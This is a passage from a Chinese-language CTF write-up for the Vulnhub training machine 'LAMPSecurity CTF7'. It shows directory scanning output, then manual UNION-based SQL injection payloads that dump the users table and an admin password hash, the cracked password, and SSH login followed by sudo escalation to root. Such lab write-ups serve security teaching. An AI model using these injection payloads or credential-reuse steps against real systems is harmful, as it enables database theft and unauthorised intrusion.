class=\"hljs-number\">44</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">314</span>B  - /css  ->  http:<span class=\"hljs-comment\">//192.168.75.140/css/              </span>\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">285</span>B  - /css.php                                          \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">30</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /db                                               \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">33</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">288</span>B  - /error/                                           \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">33</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">293</span>B  - /error/error.log                                  \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">35</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /footer                                           \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">36</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /header                                           \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">314</span>B  - /img  ->  http:<span class=\"hljs-comment\">//192.168.75.140/img/              </span>\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">287</span>B  - /img_admin                                        \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">314</span>B  - /inc  ->  http:<span class=\"hljs-comment\">//192.168.75.140/inc/              </span>\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /inc/                                             \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">286</span>B  - /<span class=\"hljs-keyword\">include</span>/\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">286</span>B  - /includes                         \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">40</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /js/                                                                              \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">46</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /newsletter                                       \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">48</span>] <span class=\"hljs-number\">200</span> -   <span class=\"hljs-number\">59</span>KB - /phpinfo                                          \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">51</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /profile                                          \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">52</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">6</span>KB - /register                                         \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">56</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">5</span>KB - /signup                                           \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">03</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">287</span>B  - /usage                                            \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">06</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">320</span>B  - /webalizer  ->  http:<span class=\"hljs-comment\">//192.168.75.140/webalizer/  </span>\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">06</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">291</span>B  - /webalizer.php                                    \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">06</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">292</span>B  - /webalizer.html                               \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">07</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">4</span>KB - /webalizer/\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">07</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">318</span>B  - /webmail  ->  http:<span class=\"hljs-comment\">//192.168.75.140/webmail/      </span>\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">07</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">304</span>B  - /webmail/src/configtest.php\n<span class=\"hljs-comment\">//删掉了很多404的</span>\n</code></pre>\n</li>\n<li>\n<p>访问可能有信息的目录</p>\n<ul>\n<li><code>/phpinfo</code> 暴露了phpinfo的信息</li>\n<li><code>/webalizer/</code> 好像是一个网站访问次数之类的统计，并且爆出来了一些目录</li>\n<li><code>/inc</code> 存放着一些网站文件</li>\n<li><code>/webmail</code> 邮件服务器登陆界面</li>\n</ul>\n</li>\n<li>\n<p><code>/signup</code> 注册了个账号，使用邮箱密码登陆的，注册后能看到一员工介绍<code>/profile&#x26;id=3</code>是关于<code>brian@localhost.localdomain</code> 的，可能可以尝试爆破</p>\n<p>并且<code>profile&#x26;id=3</code> 看着可能会造成sql注入</p>\n<ul>\n<li>\n<p>尝试sql注入-  <code>http://192.168.75.140/profile&#x26;id=3</code> （手工注入）</p>\n<pre><code class=\"hljs language-sql\"><span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>  <span class=\"hljs-keyword\">select</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">from</span> users <span class=\"hljs-keyword\">where</span> user_id <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">1</span><span class=\"hljs-string\">' 爆出语句，数值型注入\nprofile&#x26;id=1'</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 判断注入点\nprofile<span class=\"hljs-operator\">&#x26;</span>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">3</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 有<span class=\"hljs-number\">7</span>个字段\nprofile<span class=\"hljs-operator\">&#x26;</span>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">3</span> <span class=\"hljs-keyword\">order</span> <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">7</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 根据页面显示，回显位为 <span class=\"hljs-number\">1</span>，<span class=\"hljs-number\">6</span>，<span class=\"hljs-number\">7</span>\nprofile<span class=\"hljs-operator\">&#x26;</span>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">7</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 很有用的信息，当前数据库为website，数据库用户为root，数据库版本为<span class=\"hljs-number\">5.1</span><span class=\"hljs-number\">.66</span>\nprofile<span class=\"hljs-operator\">&#x26;</span>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> database(),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-keyword\">user</span>(),version()\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 当前数据库的表：contact,documents,hits,log,newsletter,payment,trainings,trainings_x_users,users\nprofile<span class=\"hljs-operator\">&#x26;</span>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,(<span class=\"hljs-keyword\">select</span> group_concat(table_name) <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema<span class=\"hljs-operator\">=</span>database()),<span class=\"hljs-number\">7</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> users表的列username,password,is_admin,last_login,user_id,realname,profile\nhttp:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.140</span><span class=\"hljs-operator\">/</span>profile<span class=\"hljs-operator\">&#x26;</span>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,(<span class=\"hljs-keyword\">select</span> group_concat(column_name) <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_schema<span class=\"hljs-operator\">=</span>database() <span class=\"hljs-keyword\">and</span> table_name<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">'users'</span>),<span class=\"hljs-number\">7</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 将users表的数据爆出来\nhttp:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.140</span><span class=\"hljs-operator\">/</span>profile<span class=\"hljs-operator\">&#x26;</span>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,(<span class=\"hljs-keyword\">select</span> group_concat(username,<span class=\"hljs-string\">'~'</span>,password,<span class=\"hljs-string\">'~'</span>,is_admin,<span class=\"hljs-string\">'~'</span>,last_login,<span class=\"hljs-string\">'~'</span>,user_id,<span class=\"hljs-string\">'~'</span>,realname,<span class=\"hljs-string\">'~'</span>,profile) <span class=\"hljs-keyword\">from</span> users),<span class=\"hljs-number\">7</span>\n</code></pre>\n<pre><code class=\"hljs language-sql\">brian<span class=\"hljs-variable\">@localhost</span>.localdomain<span class=\"hljs-operator\">~</span>\ne22f07b17f98e0d9d364584ced0e3c18<span class=\"hljs-operator\">~</span>\n<span class=\"hljs-number\">1</span><span class=\"hljs-operator\">~</span>\n<span class=\"hljs-number\">2012</span><span class=\"hljs-number\">-12</span><span class=\"hljs-number\">-19</span> <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">54</span><span class=\"hljs-operator\">~</span>\n<span class=\"hljs-number\">3</span><span class=\"hljs-operator\">~</span>\nBrian Hershel<span class=\"hljs-operator\">~</span>\nBrian <span class=\"hljs-keyword\">is</span> our technical brains behind the operations <span class=\"hljs-keyword\">and</span> a chief trainer.\n</code></pre>\n<p><code>is_admin = 1</code>,所以对我们帮助可能不小，MD5密码破译为 <code>my2cents</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p><code>index.php</code>里面登陆后好像没什么可以利用的</p>\n<p>尝试下<code>ssh</code>登录，登陆成功</p>\n<pre><code class=\"hljs language-sql\">ssh <span class=\"hljs-operator\">-</span>oHostKeyAlgorithms<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">+</span>ssh<span class=\"hljs-operator\">-</span>dss brian<span class=\"hljs-variable\">@192</span><span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.140</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nbrian<span class=\"hljs-variable\">@192</span><span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.140</span><span class=\"hljs-string\">'s password: \n[brian@localhost ~]$ \n</span></code></pre>\n<p>查看权限</p>\n<pre><code class=\"hljs language-sql\">[brian<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]$ whoami\nbrian\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\n[brian<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]$ uname <span class=\"hljs-operator\">-</span>a\nLinux localhost.localdomain <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.32</span><span class=\"hljs-number\">-279.</span>el6.i686 #<span class=\"hljs-number\">1</span> SMP Fri Jun <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">55</span> UTC <span class=\"hljs-number\">2012</span> i686 i686 i386 GNU<span class=\"hljs-operator\">/</span>Linux\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\n[brian<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]$ ip a\n<span class=\"hljs-number\">1</span>: lo: <span class=\"hljs-operator\">&#x3C;</span>LOOPBACK,UP,LOWER_UP<span class=\"hljs-operator\">></span> mtu <span class=\"hljs-number\">16436</span> qdisc noqueue state <span class=\"hljs-literal\">UNKNOWN</span> \n    link<span class=\"hljs-operator\">/</span>loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">8</span> <span class=\"hljs-keyword\">scope</span> host lo\n    inet6 ::<span class=\"hljs-number\">1</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">128</span> <span class=\"hljs-keyword\">scope</span> host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: eth0: <span class=\"hljs-operator\">&#x3C;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class=\"hljs-operator\">></span> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state <span class=\"hljs-literal\">UNKNOWN</span> qlen <span class=\"hljs-number\">1000</span>\n    link<span class=\"hljs-operator\">/</span>ether <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">9</span>d:<span class=\"hljs-number\">12</span>:a9 brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.140</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.255</span> <span class=\"hljs-keyword\">scope</span> <span class=\"hljs-keyword\">global</span> eth0\n    inet6 fe80::<span class=\"hljs-number\">20</span>c:<span class=\"hljs-number\">29</span>ff:fe9d:<span class=\"hljs-number\">12</span>a9<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">64</span> <span class=\"hljs-keyword\">scope</span> link \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\n[brian<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]$ sudo <span class=\"hljs-operator\">-</span>l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> brian <span class=\"hljs-keyword\">on</span> this host:\n    requiretty, <span class=\"hljs-operator\">!</span>visiblepw, always_set_home, env_reset, env_keep<span class=\"hljs-operator\">=</span>\"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS\",\n    env_keep<span class=\"hljs-operator\">+</span><span class=\"hljs-operator\">=</span>\"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\", env_keep<span class=\"hljs-operator\">+</span><span class=\"hljs-operator\">=</span>\"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT\n    LC_MESSAGES\", env_keep<span class=\"hljs-operator\">+</span><span class=\"hljs-operator\">=</span>\"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\", env_keep<span class=\"hljs-operator\">+</span><span class=\"hljs-operator\">=</span>\"LC_TIME LC_ALL LANGUAGE LINGUAS\n    _XKB_CHARSET XAUTHORITY\", secure_path<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">/</span>sbin\\:<span class=\"hljs-operator\">/</span>bin\\:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin\\:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin\n\n<span class=\"hljs-keyword\">User</span> brian may run the following commands <span class=\"hljs-keyword\">on</span> this host:\n    (<span class=\"hljs-keyword\">ALL</span>) <span class=\"hljs-keyword\">ALL</span>\n</code></pre>\n<p>竟然直接获得权限了</p>\n<pre><code class=\"hljs language-sql\">[brian<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]$ sudo <span class=\"hljs-operator\">-</span>i\n[root<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]# \n</code></pre>\n</li>\n</ol>","title":"Vulnhub - LAMPSecurity CTF7","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"LAMPSecurity: CTF7\n\n \n \n\n主机发现端口扫描\n\n1. 探测存活主机，`140`为靶机\n    \n    \n    \n2. 扫描主机所有端口\n    \n    \n    \n3. 扫描服务版本及系统版本\n    \n    \n    \n    `MiniServ 1.610` 通过搜索发现是文件服务器\n    \n4. 扫描漏洞\n    \n    \n    \n    发现了很多可能会..."},"recentPosts":[{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"},{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"}]},"__N_SSG":true}